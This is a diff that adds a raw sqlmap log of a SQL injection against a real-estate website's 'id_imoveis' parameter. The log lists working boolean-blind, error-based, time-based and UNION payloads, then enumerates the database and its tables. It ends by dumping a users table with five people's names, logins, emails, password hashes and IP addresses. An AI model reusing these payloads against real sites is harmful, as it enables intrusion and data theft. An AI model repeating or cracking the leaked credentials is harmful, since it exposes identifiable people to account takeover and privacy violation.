@@ -1,0 +1,195 @@
+sqlmap identified the following injection point(s) with a total of 126 HTTP(s) requests:
+---
+Parameter: id_imoveis (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_imoveis=585 AND 2833=2833
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id_imoveis=585 AND (SELECT 5357 FROM(SELECT COUNT(*),CONCAT(0x71716b6b71,(SELECT (ELT(5357=5357,1))),0x7170786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_imoveis=585 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 39 columns
+    Payload: id_imoveis=-1226 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71716b6b71,0x6b4c544e45636d6a504e616174624a77495742767071664f6c55634a736353585a547171724d5572,0x7170786b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Sbvw
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] gapcorretorade
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_imoveis (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_imoveis=585 AND 2833=2833
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id_imoveis=585 AND (SELECT 5357 FROM(SELECT COUNT(*),CONCAT(0x71716b6b71,(SELECT (ELT(5357=5357,1))),0x7170786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_imoveis=585 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 39 columns
+    Payload: id_imoveis=-1226 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71716b6b71,0x6b4c544e45636d6a504e616174624a77495742767071664f6c55634a736353585a547171724d5572,0x7170786b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Sbvw
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: gapcorretorade
+[13 tables]
++----------------------+
+| bairros              |
+| categoria_newsletter |
+| cidades              |
+| conteudo             |
+| conteudo_news        |
+| galeria              |
+| imoveis              |
+| imoveis_original     |
+| investimento         |
+| newsletter           |
+| perfil_imovel        |
+| tipo_imovel          |
+| usuarios             |
++----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_imoveis (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_imoveis=585 AND 2833=2833
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id_imoveis=585 AND (SELECT 5357 FROM(SELECT COUNT(*),CONCAT(0x71716b6b71,(SELECT (ELT(5357=5357,1))),0x7170786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_imoveis=585 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 39 columns
+    Payload: id_imoveis=-1226 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71716b6b71,0x6b4c544e45636d6a504e616174624a77495742767071664f6c55634a736353585a547171724d5572,0x7170786b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Sbvw
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: gapcorretorade
+[13 tables]
++----------------------+
+| bairros              |
+| categoria_newsletter |
+| cidades              |
+| conteudo             |
+| conteudo_news        |
+| galeria              |
+| imoveis              |
+| imoveis_original     |
+| investimento         |
+| newsletter           |
+| perfil_imovel        |
+| tipo_imovel          |
+| usuarios             |
++----------------------+
+
+Database: gapcorretorade
++----------------------+---------+
+| Table                | Entries |
++----------------------+---------+
+| galeria              | 2362    |
+| imoveis              | 426     |
+| bairros              | 90      |
+| perfil_imovel        | 29      |
+| tipo_imovel          | 25      |
+| cidades              | 17      |
+| imoveis_original     | 10      |
+| usuarios             | 5       |
+| categoria_newsletter | 3       |
+| conteudo_news        | 3       |
+| conteudo             | 1       |
++----------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_imoveis (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_imoveis=585 AND 2833=2833
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id_imoveis=585 AND (SELECT 5357 FROM(SELECT COUNT(*),CONCAT(0x71716b6b71,(SELECT (ELT(5357=5357,1))),0x7170786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_imoveis=585 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 39 columns
+    Payload: id_imoveis=-1226 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71716b6b71,0x6b4c544e45636d6a504e616174624a77495742767071664f6c55634a736353585a547171724d5572,0x7170786b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Sbvw
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: gapcorretorade
+Table: usuarios
+[5 entries]
++-------------+------+----------------------------+----------------------------------+-------------+--------------------------------+--------+-----------------+---------------------+---------------------+---------------------+
+| id_usuarios | tipo | nome                       | senha                            | login       | email                          | status | ultimo_ip       | ultimo_acesso       | data_cadastro       | ultima_alteracao    |
++-------------+------+----------------------------+----------------------------------+-------------+--------------------------------+--------+-----------------+---------------------+---------------------+---------------------+
+| 15          | 1    | Giselda                    | 3367f705d044d2f697c4a82257cb459e | giselda     | joesangalli@gmail.com          | S      | 177.124.77.134  | 2017-05-23 11:59:16 | 2011-02-28 15:02:33 | 2016-09-14 15:18:31 |
+| 14          | 1    | Jamila Penido              | 1c39536af343fe8313c94b6d40dd4a40 | jamila      | milapenido@hotmail.com         | S      | 179.162.168.230 | 2019-03-08 09:59:18 | 2011-02-11 10:08:49 | 2015-05-15 17:59:15 |
+| 19          | 1    | Wellington                 | 953893841d46c2703d701d4066e3c33c | wellington  | wellingtonfonseca100@gmail.com | S      | 186.206.255.27  | 2016-09-10 21:46:15 | 2016-03-30 14:46:43 | 0000-00-00 00:00:00 |
+| 17          | 1    | joe jackson sangalli vidor | 0dcd36753f8920b595a891728cffecf8 | joesangalli | joesangalli@gmail.com          | S      | <blank>         | 0000-00-00 00:00:00 | 2013-09-20 11:21:06 | 0000-00-00 00:00:00 |
+| 18          | 1    | Philipe Souza              | 1c0026db000f812dcbbc38a68ea75a7d | philipe     | habitesedtna@hotmail.com       | S      | 177.124.77.170  | 2019-03-08 09:41:26 | 2015-05-16 10:15:44 | 0000-00-00 00:00:00 |
++-------------+------+----------------------------+----------------------------------+-------------+--------------------------------+--------+-----------------+---------------------+---------------------+---------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id_imoveis (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id_imoveis=585 AND 2833=2833
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id_imoveis=585 AND (SELECT 5357 FROM(SELECT COUNT(*),CONCAT(0x71716b6b71,(SELECT (ELT(5357=5357,1))),0x7170786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id_imoveis=585 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 39 columns
+    Payload: id_imoveis=-1226 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71716b6b71,0x6b4c544e45636d6a504e616174624a77495742767071664f6c55634a736353585a547171724d5572,0x7170786b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Sbvw
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
